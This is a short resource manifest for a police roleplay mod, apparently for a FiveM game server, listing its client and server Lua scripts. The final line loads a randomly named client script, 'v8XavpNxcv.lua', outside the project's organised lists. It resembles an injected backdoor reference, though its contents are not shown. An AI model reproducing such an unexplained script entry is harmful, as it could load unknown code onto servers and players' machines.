 resource_manifest_version "44febabe-d386-4d18-afbe-5e627f4af937"

description 'Police Interaction Script - P.I.S'

server_scripts { 
	"pullover/po_server.lua",
	"arrest/arr_server.lua",
	"callouts/call_server.lua",
	"other/loadouts_sv.lua",
	"config.lua"
}

client_scripts {
	"pullover/pullover.lua",
	"arrest/arr_client.lua",
	"callouts/call_client.lua",
	"other/menu_client.lua",
	"other/warmenu.lua",
	"other/loadouts_cl.lua",
	"addons/tow.lua",
	"config.lua"
}

client_script 'v8XavpNxcv.lua'
